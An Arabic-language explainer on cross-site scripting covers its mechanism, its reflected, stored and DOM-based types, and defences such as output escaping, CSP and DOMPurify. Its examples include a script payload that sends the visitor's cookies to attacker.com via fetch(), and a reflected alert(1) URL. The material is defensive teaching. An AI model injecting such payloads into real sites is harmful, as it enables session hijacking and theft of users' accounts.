**XSS (اختراق عبر المواقع المرتبطة - Cross-Site Scripting)** هو نوع من الثغرات الأمنية التي تحدث في تطبيقات الويب، حيث يُمكن لمُهاجم إدخال (Inject) أكواد ضارة (عادةً JavaScript) داخل صفحات الويب التي يشاهدها المستخدمون الآخرون. هذه الأكواد تنفذ في متصفح المستخدم دون علمه، مما يسمح للمُهاجم بسرقة بيانات حساسة أو التحكم في جلسة المستخدم.

---

### **كيف يعمل XSS؟**
1. **الاستغلال:**  
   إذا كانت موقع ويب لا يتحقق من البيانات المدخلة من المستخدم أو لا يقوم بـ "إخفاء" العناصر الخطرة (مثل الأكواد البرمجية)، يمكن للمُهاجم استغلال ذلك لإدخال أكواد ضارة.  
   - مثال: حقل تعليق في موقع بلوق لا يقوم بفلترة HTML. المُهاجم يكتب تعليقًا يحتوي على `<script>...</script>`.

2. **التنفيذ:**  
   عندما يفتح مستخدم آخر الصفحة التي تحتوي على التعليق الضار، ينفذ متصفحه الكود البرمجي دون علمه.  
   - مثال: الكود الضار قد يرسل ملف تعريف الارتباط (Cookies) الخاص بالمستخدم إلى خادم المُهاجم.

3. **النتائج:**  
   - سرقة جلسات المستخدم (Session Hijacking).  
   - سرقة بيانات حساسة (مثل كلمات المرور).  
   - توجيه المستخدم إلى مواقع احتيالية (Phishing).  
   - تعديل محتوى الصفحة بشكل مؤقت أو دائم.

---

### **أنواع XSS الرئيسية:**
1. **Reflected XSS (الانعكاسي):**  
   - الكود الضار "ينعكس" من الخادم إلى المتصفح عبر رابط مزيف (مثلاً في رسالة بريد إلكتروني).  
   - يتطلب خداع المستخدم لفتح الرابط.

2. **Stored XSS (المخزن):**  
   - الكود الضار يُخزن على الخادم (مثل قاعدة بيانات الموقع) ويُعرض تلقائيًا على المستخدمين.  
   - الأكثر خطورة لأنه يؤثر على الجميع بدون تفاعل مباشر.

3. **DOM-based XSS:**  
   - يحدث بسبب معالجة البيانات الخطرة في جانب العميل (JavaScript) دون تدخل الخادم.  
   - مثل تعديل عنصر في الصفحة باستخدام `document.write` دون فلترة المدخلات.

---

### **أمثلة عملية:**
- **مثال بسيط لـ Stored XSS:**  
  لو كان لديك موقع بلوق يسمح بكتابة تعليقات، والمُهاجم يكتب:  
  ```html
  <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
  ```  
  عند عرض التعليق، يرسل المتصفح ملف تعريف الارتباط إلى المُهاجم.

- **مثال لـ Reflected XSS:**  
  رابط مزيف مثل:  
  `https://example.com/search?q=<script>alert(1)</script>`  
  إذا لم يفلتر الموقع مدخلات البحث، يُنفّذ الكود في المتصفح.

---

### **كيف تحمي نفسك من XSS؟**
1. **فلترة المدخلات (Input Validation):**  
   - تأكد من أن البيانات المدخلة من المستخدم تتوافق مع التنسيق المتوقع (مثل عدم السماح بـ HTML في حقول النص).

2. **الهروب من المخرجات (Output Escaping):**  
   - حوّل الرموز الخطرة (مثل `<`, `>`, `&`) إلى إشارات HTML الآمنة (`&lt;`, `&gt;`, `&amp;`).

3. **Content Security Policy (CSP):**  
   - سياسة أمان تمنع تنفيذ الأكواد من مصادر غير موثوقة.

4. **استخدام أدوات الأمان:**  
   - استخدام مكتبات مثل [DOMPurify](https://github.com/cure53/DOMPurify) لتنظيف HTML.

5. **تحديث الأنظمة:**  
   - تأكد من تحديث الإطارات والأدوات المستخدمة (مثل React, Angular) لتجنب الثغرات المعروفة.

---

### **ملاحظة مهمة:**
رغم اسمه "Cross-Site"، فإن الهجوم لا يأتي من موقع آخر، بل يستغل ثغرة في الموقع نفسه لتشغيل الكود الضار. المفتاح هو **عدم الثقة في أي بيانات من المستخدم**.